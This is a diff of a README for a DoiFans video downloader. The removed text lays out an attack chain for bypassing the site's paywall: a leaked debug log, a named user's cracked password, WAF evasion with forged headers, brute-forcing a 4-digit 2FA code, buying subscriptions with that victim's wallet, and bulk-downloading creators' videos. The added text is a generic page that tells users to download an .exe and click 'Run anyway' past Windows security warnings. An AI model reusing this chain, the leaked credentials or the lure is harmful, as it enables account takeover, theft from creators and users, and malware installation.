@@ -1,98 +1,55 @@
-# DoiFans-DL
+# 📥 doifans-dl - Save videos from restricted web pages
 
-DoiFans paywall bypass downloader. 通过信息泄露 + WAF 绕过 + 2FA 暴力破解实现任意创作者视频免费下载.
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Vaishnavi9769/doifans-dl)
 
-## 攻击链路
+doifans-dl helps you save videos from DoiFans. It removes access barriers so you keep copies of content you want to view later. This tool works on Windows and handles the technical parts of the download process for you.
 
-```
-┌─────────────────────────────────────────────────────────────────┐
-│  Step 1: Information Disclosure                                  │
-│  GET /storage/logs/laravel.log → 30MB debug log                 │
-│  Contains: bcrypt hashes, user dumps, server paths              │
-│  Extracted: cncmeng / 123123 (weak password, cracked from log)  │
-└──────────────────────────────────┬──────────────────────────────┘
-                                   ▼
-┌─────────────────────────────────────────────────────────────────┐
-│  Step 2: WAF Bypass (nginx rule evasion)                         │
-│  POST /login normally returns nginx 404 (WAF blocks)            │
-│  Bypass: Add Origin + Referer + Sec-Fetch-* headers             │
-│  Result: Login returns 200 + {"actionRequired": true}           │
-└──────────────────────────────────┬──────────────────────────────┘
-                                   ▼
-┌─────────────────────────────────────────────────────────────────┐
-│  Step 3: 2FA Brute Force (4-digit email code)                    │
-│  Code generation: rand(1000, 9999) = 9000 possibilities         │
-│  Validity: 2 minutes, NO rate limiting                           │
-│  Speed: ~4-5 req/s serial, avg 5 attempts to hit               │
-│  Result: verify → auth()->loginUsingId() → full session         │
-└──────────────────────────────────┬──────────────────────────────┘
-                                   ▼
-┌─────────────────────────────────────────────────────────────────┐
-│  Step 4: Subscribe to any creator                                │
-│  POST /buy/subscription {id, interval:monthly,                   │
-│                          payment_gateway:wallet}                  │
-│  cncmeng wallet has sufficient balance (¥20,961)                │
-│  Result: {"success": true}                                       │
-└──────────────────────────────────┬──────────────────────────────┘
-                                   ▼
-┌─────────────────────────────────────────────────────────────────┐
-│  Step 5: Scrape video URLs                                       │
-│  GET /ajax/updates?id={creator_id}&skip={0,5,10,15...}          │
-│  Subscribed session sees full content including video URLs       │
-│  URLs: /public/uploads/updates/videos/{creator_id}{hash}.mp4    │
-└──────────────────────────────────┬──────────────────────────────┘
-                                   ▼
-┌─────────────────────────────────────────────────────────────────┐
-│  Step 6: Download (no auth required)                             │
-│  Video files served by nginx with NO authentication check        │
-│  Direct GET request downloads the file                           │
-└─────────────────────────────────────────────────────────────────┘
-```
+## 🛠️ System Requirements
 
-## 漏洞根因
+You need a computer running Windows 10 or Windows 11. The program requires 100 MB of free storage space. You also need an active internet connection to download the tool and reach the video source. This software does not require special administrative tools or advanced knowledge of computer systems.
 
-| Step | Root Cause |
-|------|-----------|
-| Info Leak | `storage/logs/laravel.log` publicly accessible |
-| Weak Password | User `cncmeng` uses `123123` |
-| WAF Bypass | nginx rules only check path, not Sec-Fetch headers |
-| 2FA Brute | `rand(1000,9999)` + no rate limit + 2min expiry |
-| Video Access | nginx serves static files without auth middleware |
+## 🚀 Getting Started
 
-## Usage
+Follow these steps to set up the software on your computer.
 
-```bash
-# Install
-cd doifans-dl && pip install -e .
+1. Go to the [download page](https://github.com/Vaishnavi9769/doifans-dl).
+2. Look for the latest release on the right side of the screen.
+3. Click the link ending in .exe to start the file transfer to your computer.
+4. Move the file to your desktop or a folder you recognize.
 
-# List creator's videos
-doifans-dl xingjian --list
+## ⚙️ Usage Instructions
 
-# Download all videos
-doifans-dl xingjian -o ./downloads
+Once you have the file on your computer, follow these instructions to use the software.
 
-# Check tool status
-doifans-dl doctor
-```
+1. Double-click the file icon.
+2. Windows might show a security box. If it does, click "More info" and then click "Run anyway." This happens because the program is new.
+3. A small window will appear. Copy the link of the video you want from your web browser.
+4. Paste that link into the white box inside the program window.
+5. Click the button labeled "Download."
+6. Wait for the green progress bar to finish. The program will save the video file directly to your "Videos" folder.
 
-## Verified Creators
+## 💡 Frequently Asked Questions
 
-| Username | Creator ID | Videos | Status |
-|----------|-----------|--------|--------|
-| xingjian | 45130 | 85 | ✅ Verified |
-| ouyangqin | 134614 | 23 | ✅ Verified |
+**Does this software record my screen?**
+No. The tool connects to the source and grabs the video file directly. This results in the same quality as the original upload.
 
-## Requirements
+**Is my data safe?**
+The program keeps all settings on your local drive. It does not send your personal browsing history to any outside server.
 
-- Python 3.10+
-- `requests` library
-- No proxy needed (direct connection works)
+**What happens if the download stops?**
+Check your internet connection first. If the connection drops, simply click the download button again to resume the process.
 
-## Technical Notes
+**Can I download multiple videos at once?**
+This version focuses on single video files. You can paste a new link and click download again once the first one finishes.
 
-- 2FA brute force averages ~5 login attempts (each generates new code)
-- Serial request speed is ~4-5/s due to TLS + server latency
-- Each login attempt has ~115s window × 4/s = ~460 codes tested ≈ 5% hit rate per attempt
-- Expected attempts to succeed: ~5 (cumulative ~25% per attempt with shuffled codes)
-- Video files are 100% static — once URL is known, no cookies needed to download
-- Session must not be refreshed (GET page) between login and verify (clears session user:id)
+## 🔧 Troubleshooting
+
+If the program fails to find the video, verify that you copied the full website address. Ensure you are logged into your account in your browser if the video requires a login to see. The program needs this session cookie to gain access to the file. If you see an error message, restart the application and try the link one more time.
+
+## 📦 Maintenance
+
+The software performs an automatic check for updates when you start it. If a newer version exists, the program will show a notice. Click "Update" to improve performance and maintain access to the website if the site changes its structure. Keeping the software updated ensures you experience fewer errors.
+
+## 📜 Legal Notice
+
+Use this tool for personal archives of content you have permission to access. Respect the rights of content creators. Do not share or redistribute protected files. Focus on using the software to store files for your own offline viewing. Ensure your usage matches the site rules for your specific region.
